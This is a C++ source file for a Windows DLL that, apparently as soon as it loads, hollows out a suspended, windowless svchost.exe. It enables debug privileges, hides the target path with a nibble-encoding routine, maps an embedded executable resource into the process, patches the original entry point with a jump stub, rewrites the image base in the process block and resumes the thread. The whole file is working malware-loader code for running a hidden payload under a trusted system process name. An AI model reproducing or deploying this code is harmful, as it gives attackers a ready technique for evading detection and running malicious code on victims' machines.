// ProcessHollowing.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>
#include "ph.h"


#pragma comment(lib, "Advapi32.lib")

FILE * debug_file_handle = stdout;

extern "C" __declspec (dllexport) void __cdecl RegisterDll (
   HWND hwnd,        // handle to owner window
   HINSTANCE hinst,  // instance handle for the DLL
   LPTSTR lpCmdLine, // string the DLL will parse
   int nCmdShow      // show state
){
  //::MessageBox(0,lpCmdLine,0,0);
}


/*
 * Current DLL hmodule.
 */
static HMODULE dll_handle = NULL;

char * decode_split( const char * input, unsigned int str_len ){

	char *test;
	unsigned int i =0, j = 0;
	if( str_len % 2 == 0 ){

		test = (char *)calloc((str_len/2) + 1, 1);
		for( i = 0, j = 0; i < str_len; i += 2, j++ ){
			test[j] = input[i] << 4;
			test[j] += input[i+1];
		}
		
	} else {

		test = (char *)calloc(0, 1);
	}

	return test;
}

LPVOID ReadRemotePEB(HANDLE hProcess, LPVOID dwPEBAddress )
{
	LPVOID pPEB;

	BOOL bSuccess = ReadProcessMemory
		(
		hProcess,
		(LPCVOID)((size_t)dwPEBAddress + (sizeof(size_t) * 2)),
		&pPEB,
		sizeof(pPEB),
		0
		);

	if (!bSuccess)
		return 0;

	return pPEB;
}

int enableSEPrivilege(LPCTSTR name) 
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkp;

	if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) return 0;

    if(!LookupPrivilegeValue(NULL, name, &luid)) return 0;

	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = luid;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if(!AdjustTokenPrivileges(hToken, false, &tkp, sizeof(tkp), NULL, NULL)) return 0;

	if(GetLastError() == ERROR_NOT_ALL_ASSIGNED) return 0;

	CloseHandle(hToken);
	return 1;
}

void CreateHollowedProcess( const char* pDestCmdLine )
{
	HGLOBAL hResourceLoaded;  // handle to loaded resource
    HRSRC   hRes;              // handle/ptr to res. info.
    char    *ImgResData;        // pointer to resource data
    DWORD   sourceImgSize;
	NTSTATUS stat;
		
	//Get the resource
	hRes = FindResource(dll_handle, MAKEINTRESOURCE(IDR_BIN1) ,"BIN");
	if( hRes == nullptr ){
		
#ifdef _DBG
			fprintf( debug_file_handle,"Unable to find resource.\r\n");
#endif
		return;
	}

    hResourceLoaded = LoadResource(dll_handle, hRes);
	if( hResourceLoaded == nullptr ){
		
#ifdef _DBG
			fprintf( debug_file_handle,"Unable to load resource.\r\n");
#endif
		return;
	}

    ImgResData = (char *) LockResource(hResourceLoaded);
	if( hResourceLoaded == nullptr ){
		
#ifdef _DBG
			fprintf( debug_file_handle,"Unable to lock resource.\r\n");
#endif
		return;
	}

    sourceImgSize = SizeofResource(dll_handle, hRes);
	
#ifdef _DBG
		fprintf( debug_file_handle,"Creating process\r\n");
   #endif

	//Start the target process suspended
	LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
	LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();
	if (!CreateProcess((LPSTR)pDestCmdLine, NULL, NULL, NULL, NULL,
					CREATE_SUSPENDED|DETACHED_PROCESS|CREATE_NO_WINDOW,
					NULL, NULL, pStartupInfo, pProcessInfo))
	{
#ifdef _DBG
		fprintf(debug_file_handle, "[-] CreateProcessW failed. Error = %x\n", GetLastError());
#endif
		return;
	}

	//Resolve necessary functions
	ZwQueryInformationProcess = (long (__stdcall *)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG))GetProcAddress(GetModuleHandleA("ntdll"),"ZwQueryInformationProcess");
	ZwMapViewOfSection = (long (__stdcall *)(HANDLE,HANDLE,PVOID *,ULONG_PTR,SIZE_T,PLARGE_INTEGER,PSIZE_T,DWORD,ULONG,ULONG))GetProcAddress(GetModuleHandleA("ntdll"),"ZwMapViewOfSection");
	ZwUnmapViewOfSection = (long (__stdcall *)(HANDLE, PVOID))GetProcAddress(GetModuleHandleA("ntdll"),"ZwUnmapViewOfSection");
	ZwCreateSection = (long (__stdcall *)(PHANDLE,ACCESS_MASK,PDWORD,PLARGE_INTEGER,ULONG,ULONG,HANDLE))GetProcAddress(GetModuleHandleA("ntdll"),"ZwCreateSection");

	if (ZwMapViewOfSection == NULL || ZwQueryInformationProcess == NULL || ZwUnmapViewOfSection == NULL || ZwCreateSection == NULL)
	{
#ifdef _DBG
		fprintf(debug_file_handle, "[-] GetProcAddress failed\n");
#endif
	return;
	}

	//Get process information
	PROCESS_BASIC_INFORMATION pbi;
	if (ZwQueryInformationProcess(pProcessInfo->hProcess, 0, &pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL) != 0)
    {

#ifdef _DBG
		fprintf(debug_file_handle,"[-] ZwQueryInformation failed\n");
#endif
		return;
    }


#ifdef _DBG
	fprintf(debug_file_handle, "[+] UniqueProcessID = 0x%x\n", pbi.UniqueProcessId);
#endif
	SIZE_T ImageBase = (SIZE_T)ReadRemotePEB(pProcessInfo->hProcess , pbi.PebBaseAddress );



#ifdef _DBG
	fprintf(debug_file_handle, "[+] ImageBase = 0x%x\n", ImageBase);
#endif

	PLOADED_IMAGE pImage = ReadRemoteImage(pProcessInfo->hProcess, (LPCVOID)ImageBase);
	SIZE_T image_size = pImage->FileHeader->OptionalHeader.SizeOfImage;
	SIZE_T rem_entry_pt = pImage->FileHeader->OptionalHeader.AddressOfEntryPoint;	

	SIZE_T nb_read;
	char *read_proc = (char *)malloc(image_size);
	if (!ReadProcessMemory(pProcessInfo->hProcess, (LPCVOID)ImageBase, read_proc, image_size, &nb_read) )
	{

#ifdef _DBG
		fprintf(debug_file_handle, "[-] ReadProcessMemory failed\n");
#endif
		return;
	}


//****************************************************************************************************************


	//Load replacement image
	PLOADED_IMAGE pSourceImage = GetLoadedImage((BYTE *)ImgResData);

	LARGE_INTEGER a;
	a.QuadPart = pSourceImage->FileHeader->OptionalHeader.SizeOfImage;
	HANDLE image_sect;
	if ((stat = ZwCreateSection(&image_sect, SECTION_ALL_ACCESS, NULL, &a, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != STATUS_SUCCESS)
	{
#ifdef _DBG
		fprintf(debug_file_handle,"[-] ZwCreateSection failed. NTSTATUS = %x\n", stat);
#endif
		return;
	}

	SIZE_T size;
	size = pSourceImage->FileHeader->OptionalHeader.SizeOfImage;

	PVOID BaseAddress = (PVOID)0;
	if ((stat = ZwMapViewOfSection(image_sect, pProcessInfo->hProcess, &BaseAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
	{
#ifdef _DBG
		fprintf(debug_file_handle, "[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
#endif
		return;
	}	

	//Unmap the test location
	ZwUnmapViewOfSection(pProcessInfo->hProcess, BaseAddress);
	PVOID RemoteAddress = BaseAddress;

	//Set size
	size = pSourceImage->FileHeader->OptionalHeader.SizeOfImage;
	BaseAddress = (PVOID)0;
	if ((stat = ZwMapViewOfSection(image_sect, GetCurrentProcess(), &BaseAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
	{
#ifdef _DBG
		fprintf(debug_file_handle, "[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
#endif
		return;
	}	
		
	#ifdef _M_IX86
		PIMAGE_NT_HEADERS32 ptr = (PIMAGE_NT_HEADERS32)(pSourceImage->FileHeader);
	#endif 

	#ifdef _M_X64
		PIMAGE_NT_HEADERS64 ptr = (PIMAGE_NT_HEADERS64)(pSourceImage->FileHeader);
	#endif 

	//Get the address of the entry point
	PVOID addr = (PVOID)&ptr->OptionalHeader.ImageBase;
	PVOID beg = (PVOID)ptr;
	size_t diff = (size_t)addr - (size_t)beg;
	PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)ImgResData;
	size_t image_base = pDOSHeader->e_lfanew + diff;
		
	//copy the headers to the dest buffer
	memcpy(	BaseAddress, ImgResData, pSourceImage->FileHeader->OptionalHeader.SizeOfHeaders );
	
	//Image entry
#ifdef _DBG
	fprintf(debug_file_handle, "Loaded image entry point: %d\n", pSourceImage->FileHeader->OptionalHeader.AddressOfEntryPoint);
#endif 

	//Base before
	size_t before = 0;
	memcpy(&before, (PVOID)((size_t)BaseAddress + image_base), sizeof(before)); 
	
#ifdef _DBG
	fprintf(debug_file_handle, "Base before: %p\n", before);
#endif 


	//Copy updated image base address
	memcpy((PVOID)((size_t)BaseAddress + image_base), &RemoteAddress, sizeof(RemoteAddress)); 

	//Copy each section of the replacement binary
	for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
	{
		if (!pSourceImage->Sections[x].PointerToRawData)
			continue;

		PVOID pSectionDestination = (PVOID)((size_t)BaseAddress + pSourceImage->Sections[x].VirtualAddress);

		#ifdef _DBG
			fprintf( debug_file_handle,"Writing %s section to 0x%p\r\n", pSourceImage->Sections[x].Name, pSectionDestination);
		#endif

		memcpy( pSectionDestination, &ImgResData[pSourceImage->Sections[x].PointerToRawData],
			pSourceImage->Sections[x].SizeOfRawData);
	}	


#ifdef _DBG
	fprintf( debug_file_handle,
			"Source image base: 0x%p\r\n"
			"Destination image base: 0x%p\r\n",
			pSourceImage->FileHeader->OptionalHeader.ImageBase,
			RemoteAddress
	);
#endif

	//Get the difference between the new destination memory address and the image base
	size_t dwDelta = 0;
	boolean subtract = false;
	if ( (size_t)RemoteAddress >= (size_t)pSourceImage->FileHeader->OptionalHeader.ImageBase )
		dwDelta =  (size_t)RemoteAddress - (size_t)pSourceImage->FileHeader->OptionalHeader.ImageBase;	
	else {
		dwDelta = (size_t)pSourceImage->FileHeader->OptionalHeader.ImageBase - (size_t)RemoteAddress;
		subtract = true;
	}
	

	#ifdef _DBG
		fprintf( debug_file_handle,"Relocation delta: 0x%p\r\n", dwDelta);
		fprintf( debug_file_handle,"Writing headers\r\n");
	#endif

    // Rebase image if necessary, x86 and x64
	if (dwDelta)
		for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
		{
			char* pSectionName = ".reloc";		

			if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
				continue;

			#ifdef _DBG
				fprintf( debug_file_handle,"Rebasing image\r\n");
			#endif

			DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
			DWORD dwOffset = 0;

			IMAGE_DATA_DIRECTORY relocData = 
				pSourceImage->FileHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

			while (dwOffset < relocData.Size)
			{
				PBASE_RELOCATION_BLOCK pBlockheader = (PBASE_RELOCATION_BLOCK)&ImgResData[dwRelocAddr + dwOffset];

				dwOffset += sizeof(BASE_RELOCATION_BLOCK);

				DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);

				PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&ImgResData[dwRelocAddr + dwOffset];

				for (DWORD y = 0; y <  dwEntryCount; y++)
				{
					dwOffset += sizeof(BASE_RELOCATION_ENTRY);

					if (pBlocks[y].Type == 0)
						continue;

					DWORD dwFieldAddress = pBlockheader->PageAddress + pBlocks[y].Offset;
					size_t dwBuffer = 0;

					//Copy the address from memory
					memcpy(&dwBuffer, (PVOID)((size_t)BaseAddress + dwFieldAddress), sizeof(dwBuffer));

					//Update it
					if( subtract )
						dwBuffer -= dwDelta;
					else
						dwBuffer += dwDelta;

					//Copy back the fixed up address
					memcpy((PVOID)((size_t)BaseAddress + dwFieldAddress), &dwBuffer, sizeof(dwBuffer));
	
				}
			}

			break;
		}


	
	//Map the orginial over our data
	size = pSourceImage->FileHeader->OptionalHeader.SizeOfImage;
	if ((stat = ZwMapViewOfSection(image_sect, pProcessInfo->hProcess, &RemoteAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
	{
#ifdef _DBG
		fprintf(debug_file_handle, "[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
#endif
		return;
	}


//*************************************************************************************************

	size = image_size;
	a.QuadPart = size;
	HANDLE entry_sect;
	if ((stat = ZwCreateSection(&entry_sect, SECTION_ALL_ACCESS, NULL, &a, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != STATUS_SUCCESS)
	{
#ifdef _DBG
		fprintf(debug_file_handle,"[-] ZwCreateSection failed. NTSTATUS = %x\n", stat);
#endif
		return;
	}

	//Set size
	BaseAddress = (PVOID)0;
	if ((stat = ZwMapViewOfSection(entry_sect, GetCurrentProcess(), &BaseAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
	{
#ifdef _DBG
		fprintf(debug_file_handle, "[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
#endif
		return;
	}	
	
	//Entrypoint addr
	size_t entr_addr = (size_t)RemoteAddress + pSourceImage->FileHeader->OptionalHeader.AddressOfEntryPoint;
	DWORD counter = 0;	
	unsigned char jmpshellcode[sizeof(size_t) + 4];

#ifdef _M_X64
	*(unsigned char *)&jmpshellcode[counter++] = 0x48;
#endif

	*(unsigned char *)&jmpshellcode[counter++] = 0xb8;	   // MOV EAX, IMM64 (entry addr)
	*(size_t *) &jmpshellcode[counter] = entr_addr;
	counter = counter + sizeof(size_t);

	//PUSH and return
	*(unsigned char *)&jmpshellcode[counter++] = 0x50;     // PUSH EAX
	*(unsigned char *)&jmpshellcode[counter++] = 0xc3;     // RET

	//copy the binary to the mapped buffer
	//memset((BYTE*)read_proc + rem_entry_pt, 0xCC, 1);
	memcpy((BYTE*)read_proc + rem_entry_pt, jmpshellcode, sizeof(jmpshellcode));
	memcpy(BaseAddress, read_proc, image_size);
	BaseAddress = (PVOID)ImageBase;

	//Unmap the orginal image
	ZwUnmapViewOfSection(pProcessInfo->hProcess, BaseAddress);

	//Map the orginial over our data
	if ((stat = ZwMapViewOfSection(entry_sect, pProcessInfo->hProcess, &BaseAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
	{
#ifdef _DBG
		fprintf(debug_file_handle, "[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
#endif
		return;
	}

	//*********************
	//Write the new ImageBase to the PEB or it will not work
	//*********************
	WriteProcessMemory (
		pProcessInfo->hProcess,
		(LPVOID)((size_t) pbi.PebBaseAddress + (sizeof(size_t) * 2)),
		&RemoteAddress,
		sizeof(RemoteAddress),
		0
	);

	//Resume execution
	ResumeThread(pProcessInfo->hThread);
	//system("pause");

}

int main(int argc, char* argv[])
{

#ifdef _DBG
	FILE *f;
	fopen_s(&f, "C:\\debug_dll.log", "w");
	if( f == nullptr )
		return -1;

	setvbuf(f, NULL, _IONBF, 0);
	debug_file_handle = f;
#endif
	
	std::string hollow_proc_str;
	int adminPrivs = enableSEPrivilege(SE_DEBUG_NAME);

	//"\\System32\\svchost.exe"
	std::string path(decode_split("\x5\xc\x5\xc\x5\x3\x7\x9\x7\x3\x7\x4\x6\x5\x6\xd\x3\x3\x3\x2\x5\xc\x5\xc\x7\x3\x7\x6\x6\x3\x6\x8\x6\xf\x7\x3\x7\x4\x2\xe\x6\x5\x7\x8\x6\x5",46));
	//systemroot
	std::string root(decode_split("\x7\x3\x7\x9\x7\x3\x7\x4\x6\x5\x6\xd\x7\x2\x6\xf\x6\xf\x7\x4",20));

	char * pSystemRoot = nullptr;
	size_t len;
	_dupenv_s (&pSystemRoot, &len, root.c_str());
	if( pSystemRoot && strlen(pSystemRoot) > 0 ){

		//Add system root
		hollow_proc_str.assign(pSystemRoot);
		hollow_proc_str.append(path);

		CreateHollowedProcess( hollow_proc_str.c_str());
	}

#ifdef _DBG
	fclose(debug_file_handle);
#endif

	return 0;
}

//===============================================================================================//
BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;
	DWORD dwResult = 0;
	unsigned int ret =0;

	switch( dwReason ) 
    { 
		case DLL_PROCESS_ATTACH:
		  dll_handle = (HMODULE)hinstDLL;
          main(0, nullptr);
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}

